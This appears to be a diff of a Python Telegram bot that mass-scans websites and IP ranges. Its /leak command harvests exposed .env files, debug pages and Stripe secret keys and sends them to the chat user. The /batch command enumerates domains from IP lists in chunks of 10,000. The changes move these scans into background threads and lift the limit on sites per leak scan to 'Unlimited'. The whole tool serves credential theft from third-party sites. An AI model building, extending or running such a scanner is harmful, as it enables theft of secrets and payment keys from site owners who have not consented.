+    bot.send_message(chat_id, "🏁 Done.", reply_markup=make_back_button())
+    clear_scan(chat_id)
+
+
 @bot.message_handler(commands=["leak"])
 def cmd_leak(message):
     parts = message.text.split()
@@ -1070,7 +1230,7 @@ def cmd_leak(message):
         bot.register_next_step_handler(message, process_leak_file)
         return
 
-    # Direct mode
+    # Direct mode — background thread
     sites = [parse_url(p) for p in parts[1:] if p.strip()]
 
     if not sites:
@@ -1088,35 +1248,7 @@ def cmd_leak(message):
         f"<code>{progress_bar(0)}</code> Starting...",
         reply_markup=make_cancel_button())
 
-    set_scan(message.chat.id, "leak")
-    try:
-        env_http, env_https, debug_hits, sk_sites, sk_keys, elapsed = run_leak_scan(
-            message.chat.id, sites, status_msg.message_id, "Leak Scan", "both"
-        )
-    finally:
-        clear_scan(message.chat.id)
-
-    env_sites = sorted(set(list(env_http.keys()) + list(env_https.keys())))
-    summary = (
-        f"✅ <b>Leak Scan Complete</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"<code>{progress_bar(100)}</code> 100%\n\n"
-        f"🎯 Sites: <b>{fmt_num(len(sites))}</b>\n"
-        f"📄 .env (HTTP): <b>{len(env_http)}</b>\n"
-        f"🔐 .env (HTTPS): <b>{len(env_https)}</b>\n"
-        f"🐛 Debug: <b>{len(debug_hits)}</b>\n"
-        f"💳 Stripe keys: <b>{len(sk_keys)}</b>\n\n"
-        f"🕐 {fmt_time(elapsed)}"
-    )
-
-    try:
-        bot.edit_message_text(summary, message.chat.id, status_msg.message_id)
-    except Exception:
-        bot.send_message(message.chat.id, summary)
-
-    deliver_leak_files(message.chat.id, env_http, env_https, debug_hits, sk_sites, sk_keys, "leak")
-
-    bot.send_message(message.chat.id, "🏁 Done.", reply_markup=make_back_button())
+    run_in_background(_leak_worker, message.chat.id, sites, status_msg.message_id)
 
 
 def process_leak_file(message):
@@ -1177,7 +1309,6 @@ def cb_leak_type(call):
         return
 
     bot.answer_callback_query(call.id)
-    set_scan(chat_id, "leak_file")
 
     msg_id = call.message.message_id
 
@@ -1196,45 +1327,7 @@ def cb_leak_type(call):
         chat_id, msg_id, reply_markup=make_cancel_button()
     )
 
-    try:
-        env_http, env_https, debug_hits, sk_sites, sk_keys, elapsed = run_leak_scan(
-            chat_id, sites, msg_id, type_label, scan_type
-        )
-    finally:
-        clear_scan(chat_id)
-
-    # Summary
-    env_sites = sorted(set(list(env_http.keys()) + list(env_https.keys())))
-    summary = (
-        f"✅ <b>{type_label} Complete</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"<code>{progress_bar(100)}</code> 100%\n\n"
-        f"🎯 Sites scanned: <b>{fmt_num(len(sites))}</b>\n"
-    )
-
-    if scan_type in ("env", "both"):
-        summary += (
-            f"📄 .env (HTTP): <b>{len(env_http)}</b>\n"
-            f"🔐 .env (HTTPS): <b>{len(env_https)}</b>\n"
-            f"🔓 Exposed: <b>{len(env_sites)}</b>\n"
-        )
-
-    if scan_type in ("debug", "both"):
-        summary += f"🐛 Debug: <b>{len(debug_hits)}</b>\n"
-
-    summary += (
-        f"💳 Stripe keys: <b>{len(sk_keys)}</b>\n\n"
-        f"🕐 Time: {fmt_time(elapsed)}"
-    )
-
-    try:
-        bot.edit_message_text(summary, chat_id, msg_id)
-    except Exception:
-        bot.send_message(chat_id, summary)
-
-    deliver_leak_files(chat_id, env_http, env_https, debug_hits, sk_sites, sk_keys, "leakfile")
-
-    bot.send_message(chat_id, "🏁 Done.", reply_markup=make_back_button())
+    run_in_background(_leak_worker, chat_id, sites, msg_id, type_label, scan_type)
 
 
 # ═══════════════════════════════════════════════
@@ -1293,6 +1386,56 @@ def cmd_chain(message):
 # ═══════════════════════════════════════════════
 #  /batch — File upload IP scan
 # ═══════════════════════════════════════════════
+
+def _batch_worker(chat_id, all_ips, msg_id):
+    set_scan(chat_id, "batch")
+
+    CHUNK = 10000
+    chunks = [all_ips[i:i+CHUNK] for i in range(0, len(all_ips), CHUNK)] if len(all_ips) > CHUNK else [all_ips]
+
+    all_domains = set()
+    total_found = 0
+    total_scanned = 0
+    total_time = 0
+
+    try:
+        for chunk in chunks:
+            if not get_scan(chat_id):
+                break
+            domains, found, scanned, elapsed = run_ip_scan(chat_id, chunk, msg_id)
+            all_domains.update(domains)
+            total_found += found
+            total_scanned += scanned
+            total_time += elapsed
+    except Exception as e:
+        log.error(f"Batch error: {e}")
+        bot.send_message(chat_id, f"❌ Error: {str(e)[:100]}", reply_markup=make_back_button())
+        clear_scan(chat_id)
+        return
+
+    summary = (
+        f"✅ <b>Batch Complete</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"<code>{progress_bar(100)}</code> 100%\n\n"
+        f"📊 {fmt_num(total_scanned)} IPs · 🟢 {fmt_num(total_found)} hosts\n"
+        f"🌐 Domains: <b>{fmt_num(len(all_domains))}</b>\n"
+        f"🕐 {fmt_time(total_time)}"
+    )
+    try:
+        bot.edit_message_text(summary, chat_id, msg_id)
+    except Exception:
+        bot.send_message(chat_id, summary)
+
+    if all_domains:
+        bot.send_document(chat_id,
+            make_txt_file("\n".join(sorted(all_domains)), "batch_sites.txt"),
+            caption=f"🌐 {fmt_num(len(all_domains))} domains",
+            reply_markup=make_back_button())
+    else:
+        bot.send_message(chat_id, "😕 No sites.", reply_markup=make_back_button())
+
+    clear_scan(chat_id)
+
 
 @bot.message_handler(commands=["batch"])
 def cmd_batch(message):
@@ -1363,47 +1506,7 @@ def cb_batch(call):
         f"<code>{progress_bar(0)}</code> Starting...",
         chat_id, call.message.message_id, reply_markup=make_cancel_button())
 
-    CHUNK = 10000
-    chunks = [all_ips[i:i+CHUNK] for i in range(0, len(all_ips), CHUNK)] if len(all_ips) > CHUNK else [all_ips]
-
-    all_domains = set()
-    total_found = 0
-    total_scanned = 0
-    total_time = 0
-
-    set_scan(chat_id, "batch")
-    try:
-        for chunk in chunks:
-            if not get_scan(chat_id):
-                break
-            domains, found, scanned, elapsed = run_ip_scan(chat_id, chunk, call.message.message_id)
-            all_domains.update(domains)
-            total_found += found
-            total_scanned += scanned
-            total_time += elapsed
-    finally:
-        clear_scan(chat_id)
-
-    summary = (
-        f"✅ <b>Batch Complete</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"<code>{progress_bar(100)}</code> 100%\n\n"
-        f"📊 {fmt_num(total_scanned)} IPs · 🟢 {fmt_num(total_found)} hosts\n"
-        f"🌐 Domains: <b>{fmt_num(len(all_domains))}</b>\n"
-        f"🕐 {fmt_time(total_time)}"
-    )
-    try:
-        bot.edit_message_text(summary, chat_id, call.message.message_id)
-    except Exception:
-        bot.send_message(chat_id, summary)
-
-    if all_domains:
-        bot.send_document(chat_id,
-            make_txt_file("\n".join(sorted(all_domains)), "batch_sites.txt"),
-            caption=f"🌐 {fmt_num(len(all_domains))} domains",
-            reply_markup=make_back_button())
-    else:
-        bot.send_message(chat_id, "😕 No sites.", reply_markup=make_back_button())
+    run_in_background(_batch_worker, chat_id, all_ips, call.message.message_id)
 
 
 # ═══════════════════════════════════════════════
@@ -1512,9 +1615,10 @@ def cb_settings(call):
         f"⚙️ <b>Settings</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
         f"Threads: <b>{MAX_THREADS}</b>\n"
         f"IPs/prefix: <b>{DEFAULT_IPS_PER_PREFIX}</b>\n"
-        f"Timeout: <b>{SCAN_TIMEOUT}s</b>\n"
-        f"API: <b>RIPE Stat</b>\n"
-        f"Max leak sites: <b>{MAX_SITES_FOR_LEAK}</b>",
+        f"Scan timeout: <b>{SCAN_TIMEOUT}s</b>\n"
+        f"Leak timeout: <b>{LEAK_TIMEOUT}s</b>\n"
+        f"Batch size: <b>{LEAK_BATCH_SIZE}</b>\n"
+        f"Max leak sites: <b>Unlimited</b>",
         call.message.chat.id, call.message.message_id, reply_markup=make_back_button())
 
 
@@ -1562,6 +1666,12 @@ def cb_cancel(call):
 if __name__ == "__main__":
     log.info("Bot starting...")
     log.info(f"Threads: {MAX_THREADS}")
+
+    # Drop stale updates from previous instance — prevents 409 Conflict
+    try:
+        bot.drop_pending_updates()
+    except Exception as e:
+        log.warning(f"drop_pending_updates failed: {e}")
 
     while True:
         try:
